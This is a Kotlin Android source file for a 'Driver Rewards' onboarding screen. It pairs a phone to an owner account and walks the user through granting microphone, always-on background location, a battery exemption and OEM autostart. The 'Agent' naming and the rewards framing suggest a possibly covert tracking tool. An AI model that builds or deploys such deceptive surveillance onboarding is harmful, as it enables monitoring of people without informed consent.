// Package: com.sm.driverrewards.ui.setup
// Driver onboarding and permission guidance screen
package com.sm.driverrewards.ui.setup

import android.Manifest
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import com.google.firebase.messaging.FirebaseMessaging
import com.sm.driverrewards.DriverRewardsApp
import com.sm.driverrewards.data.local.AgentPreferences
import com.sm.driverrewards.data.repository.AgentRepository
import com.sm.driverrewards.ui.theme.*
import kotlinx.coroutines.launch

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun SetupScreen(
    onPairSuccess: () -> Unit
) {
    val context = LocalContext.current
    val coroutineScope = rememberCoroutineScope()
    val prefs = remember { AgentPreferences(context) }
    val repository = remember { AgentRepository() }

    var driverName by remember { mutableStateOf("") }
    var pairingCode by remember { mutableStateOf("") }
    var isLoading by remember { mutableStateOf(false) }
    var errorMessage by remember { mutableStateOf<String?>(null) }

    // Permission tracking states
    var hasNotificationPermission by remember {
        mutableStateOf(
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
            } else true
        )
    }

    var hasMicPermission by remember {
        mutableStateOf(
            ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
        )
    }

    var hasForegroundLocationPermission by remember {
        mutableStateOf(
            ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        )
    }

    var hasBackgroundLocationPermission by remember {
        mutableStateOf(
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED
            } else true
        )
    }

    var isBatteryOptimizationIgnored by remember {
        mutableStateOf(
            valPowerManager(context).isIgnoringBatteryOptimizations(context.packageName)
        )
    }

    // Launchers
    val notificationLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        hasNotificationPermission = isGranted
    }

    val micLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        hasMicPermission = isGranted
    }

    val foregroundLocationLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        hasForegroundLocationPermission = permissions[Manifest.permission.ACCESS_FINE_LOCATION] == true
    }

    val backgroundLocationLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        hasBackgroundLocationPermission = isGranted
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Text(
                        "SM Driver Partner Activation",
                        fontWeight = FontWeight.Bold,
                        color = Color.White
                    )
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = BluePrimary
                )
            )
        }
    ) { innerPadding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(innerPadding)
                .background(BackgroundLight)
                .verticalScroll(rememberScrollState())
                .padding(16.dp),
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            // Header card
            Card(
                shape = RoundedCornerShape(12.dp),
                colors = CardDefaults.cardColors(containerColor = CardWhite),
                elevation = CardDefaults.cardElevation(defaultElevation = 2.dp),
                modifier = Modifier.fillMaxWidth()
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Text(
                        text = "Welcome to Driver Rewards",
                        fontSize = 20.sp,
                        fontWeight = FontWeight.Bold,
                        color = TextDark
                    )
                    Spacer(modifier = Modifier.height(4.dp))
                    Text(
                        text = "Complete the one-time registration and telemetry permissions to earn route bonuses, mileage rewards, and safety incentives.",
                        fontSize = 13.sp,
                        color = TextMuted
                    )
                }
            }

            // Driver Information Section
            Card(
                shape = RoundedCornerShape(12.dp),
                colors = CardDefaults.cardColors(containerColor = CardWhite),
                elevation = CardDefaults.cardElevation(defaultElevation = 2.dp),
                modifier = Modifier.fillMaxWidth()
            ) {
                Column(
                    modifier = Modifier.padding(16.dp),
                    verticalArrangement = Arrangement.spacedBy(12.dp)
                ) {
                    Text(
                        text = "Partner Information",
                        fontSize = 16.sp,
                        fontWeight = FontWeight.SemiBold,
                        color = TextDark
                    )

                    OutlinedTextField(
                        value = driverName,
                        onValueChange = { driverName = it },
                        label = { Text("Driver Full Name") },
                        placeholder = { Text("e.g. John Doe") },
                        leadingIcon = { Icon(Icons.Default.Person, contentDescription = null, tint = BluePrimary) },
                        modifier = Modifier.fillMaxWidth(),
                        singleLine = true
                    )

                    OutlinedTextField(
                        value = pairingCode,
                        onValueChange = { pairingCode = it.uppercase() },
                        label = { Text("Fleet Pairing Code") },
                        placeholder = { Text("e.g. SM-849201") },
                        leadingIcon = { Icon(Icons.Default.VpnKey, contentDescription = null, tint = GoldAccent) },
                        modifier = Modifier.fillMaxWidth(),
                        singleLine = true
                    )
                }
            }

            // Permission Checklist Section
            Card(
                shape = RoundedCornerShape(12.dp),
                colors = CardDefaults.cardColors(containerColor = CardWhite),
                elevation = CardDefaults.cardElevation(defaultElevation = 2.dp),
                modifier = Modifier.fillMaxWidth()
            ) {
                Column(
                    modifier = Modifier.padding(16.dp),
                    verticalArrangement = Arrangement.spacedBy(10.dp)
                ) {
                    Text(
                        text = "Required Service Permissions",
                        fontSize = 16.sp,
                        fontWeight = FontWeight.SemiBold,
                        color = TextDark
                    )
                    Text(
                        text = "Grant each permission to verify driving mileage and safety telemetry.",
                        fontSize = 12.sp,
                        color = TextMuted
                    )

                    Divider(modifier = Modifier.padding(vertical = 4.dp))

                    // 1. Notification
                    PermissionRow(
                        title = "Notifications",
                        desc = "Trip alerts and milestone broadcasts",
                        icon = Icons.Default.Notifications,
                        isGranted = hasNotificationPermission,
                        onClick = {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                                notificationLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
                            }
                        }
                    )

                    // 2. Microphone
                    PermissionRow(
                        title = "Voice Notes & Audio",
                        desc = "Hands-free voice telemetry for dispatch",
                        icon = Icons.Default.Mic,
                        isGranted = hasMicPermission,
                        onClick = {
                            micLauncher.launch(Manifest.permission.RECORD_AUDIO)
                        }
                    )

                    // 3. Foreground Location
                    PermissionRow(
                        title = "Precise Location",
                        desc = "Route verification and trip tracking",
                        icon = Icons.Default.LocationOn,
                        isGranted = hasForegroundLocationPermission,
                        onClick = {
                            foregroundLocationLauncher.launch(
                                arrayOf(
                                    Manifest.permission.ACCESS_FINE_LOCATION,
                                    Manifest.permission.ACCESS_COARSE_LOCATION
                                )
                            )
                        }
                    )

                    // 4. Background Location ("Allow all the time")
                    PermissionRow(
                        title = "Background Location",
                        desc = "Select 'Allow all the time' for continuous shift logging",
                        icon = Icons.Default.Map,
                        isGranted = hasBackgroundLocationPermission,
                        onClick = {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                                if (hasForegroundLocationPermission) {
                                    backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                                } else {
                                    foregroundLocationLauncher.launch(
                                        arrayOf(
                                            Manifest.permission.ACCESS_FINE_LOCATION,
                                            Manifest.permission.ACCESS_COARSE_LOCATION
                                        )
                                    )
                                }
                            }
                        }
                    )

                    // 5. Battery Optimization
                    PermissionRow(
                        title = "Battery Unrestricted",
                        desc = "Disable aggressive sleep for reliable mileage logging",
                        icon = Icons.Default.BatteryChargingFull,
                        isGranted = isBatteryOptimizationIgnored,
                        onClick = {
                            requestIgnoreBatteryOptimization(context)
                            isBatteryOptimizationIgnored = valPowerManager(context).isIgnoringBatteryOptimizations(context.packageName)
                        }
                    )

                    // 6. OEM Autostart
                    PermissionRow(
                        title = "OEM Background Autostart",
                        desc = "Enable background execution on Xiaomi, Samsung, Vivo, Oppo",
                        icon = Icons.Default.SettingsPower,
                        isGranted = false,
                        buttonLabel = "Open Settings",
                        onClick = {
                            openOemAutostartSettings(context)
                        }
                    )
                }
            }

            // Error display
            if (errorMessage != null) {
                Surface(
                    color = MaterialTheme.colorScheme.errorContainer,
                    shape = RoundedCornerShape(8.dp),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Text(
                        text = errorMessage ?: "",
                        color = MaterialTheme.colorScheme.onErrorContainer,
                        modifier = Modifier.padding(12.dp),
                        fontSize = 13.sp
                    )
                }
            }

            // Submit Button
            Button(
                onClick = {
                    if (driverName.isBlank() || pairingCode.isBlank()) {
                        errorMessage = "Please enter driver name and pairing code."
                        return@Button
                    }
                    isLoading = true
                    errorMessage = null

                    coroutineScope.launch {
                        // FCM token fetch
                        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
                            val token = if (task.isSuccessful) task.result else null
                            if (token != null) {
                                prefs.setFcmToken(token)
                            }

                            coroutineScope.launch {
                                val result = repository.pairDevice(
                                    pairingCode = pairingCode,
                                    driverName = driverName,
                                    model = "${Build.MANUFACTURER} ${Build.MODEL}",
                                    androidVersion = Build.VERSION.RELEASE,
                                    fcmToken = token
                                )

                                isLoading = false
                                if (result.isSuccess) {
                                    val data = result.getOrNull()
                                    if (data != null && data.deviceId != null && data.ownerId != null) {
                                        prefs.savePairing(
                                            deviceId = data.deviceId,
                                            ownerId = data.ownerId,
                                            driverName = driverName
                                        )
                                        DriverRewardsApp.instance.scheduleHeartbeatWorker()
                                        onPairSuccess()
                                    } else {
                                        errorMessage = "Invalid response from server. Check code."
                                    }
                                } else {
                                    errorMessage = result.exceptionOrNull()?.message ?: "Pairing failed. Check pairing code."
                                }
                            }
                        }
                    }
                },
                modifier = Modifier
                    .fillMaxWidth()
                    .height(50.dp),
                shape = RoundedCornerShape(10.dp),
                colors = ButtonDefaults.buttonColors(containerColor = BluePrimary),
                enabled = !isLoading
            ) {
                if (isLoading) {
                    CircularProgressIndicator(color = Color.White, modifier = Modifier.size(20.dp), strokeWidth = 2.dp)
                } else {
                    Icon(Icons.Default.CheckCircle, contentDescription = null, modifier = Modifier.size(18.dp))
                    Spacer(modifier = Modifier.width(8.dp))
                    Text("Connect & Activate Rewards", fontWeight = FontWeight.Bold, fontSize = 15.sp)
                }
            }

            Spacer(modifier = Modifier.height(20.dp))
        }
    }
}

@Composable
private fun PermissionRow(
    title: String,
    desc: String,
    icon: ImageVector,
    isGranted: Boolean,
    buttonLabel: String = "Grant",
    onClick: () -> Unit
) {
    Row(
        modifier = Modifier
            .fillMaxWidth()
            .clickable { onClick() }
            .padding(vertical = 6.dp),
        verticalAlignment = Alignment.CenterVertically
    ) {
        Box(
            modifier = Modifier
                .size(36.dp)
                .background(if (isGranted) Color(0xFFE8F5E9) else Color(0xFFF1F5F9), CircleShape),
            contentAlignment = Alignment.Center
        ) {
            Icon(
                imageVector = icon,
                contentDescription = null,
                tint = if (isGranted) SuccessGreen else BluePrimary,
                modifier = Modifier.size(20.dp)
            )
        }

        Spacer(modifier = Modifier.width(12.dp))

        Column(modifier = Modifier.weight(1f)) {
            Text(title, fontWeight = FontWeight.SemiBold, fontSize = 14.sp, color = TextDark)
            Text(desc, fontSize = 11.sp, color = TextMuted, lineHeight = 14.sp)
        }

        Spacer(modifier = Modifier.width(8.dp))

        if (isGranted) {
            Icon(
                Icons.Default.CheckCircle,
                contentDescription = "Granted",
                tint = SuccessGreen,
                modifier = Modifier.size(22.dp)
            )
        } else {
            OutlinedButton(
                onClick = onClick,
                contentPadding = PaddingValues(horizontal = 10.dp, vertical = 2.dp),
                shape = RoundedCornerShape(6.dp)
            ) {
                Text(buttonLabel, fontSize = 11.sp)
            }
        }
    }
}

private fun valPowerManager(context: Context): PowerManager {
    return context.getSystemService(Context.POWER_SERVICE) as PowerManager
}

private fun requestIgnoreBatteryOptimization(context: Context) {
    try {
        val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
            data = Uri.parse("package:${context.packageName}")
        }
        context.startActivity(intent)
    } catch (_: Exception) {
        try {
            val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
            context.startActivity(intent)
        } catch (_: Exception) {}
    }
}

private fun openOemAutostartSettings(context: Context) {
    val intents = listOf(
        // Xiaomi / MIUI
        Intent().setComponent(ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")),
        // Oppo / ColorOS
        Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity")),
        Intent().setComponent(ComponentName("com.oppo.safe", "com.oppo.safe.permission.startup.StartupAppListActivity")),
        // Vivo / Funtouch
        Intent().setComponent(ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")),
        Intent().setComponent(ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity")),
        // Huawei / Honor
        Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity")),
        // Samsung OneUI
        Intent().setComponent(ComponentName("com.samsung.android.lool", "com.samsung.android.sm.battery.ui.BatteryActivity"))
    )

    for (intent in intents) {
        try {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
            return
        } catch (_: Exception) {}
    }

    // Fallback to application details settings
    try {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.parse("package:${context.packageName}")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        context.startActivity(intent)
    } catch (_: Exception) {}
}
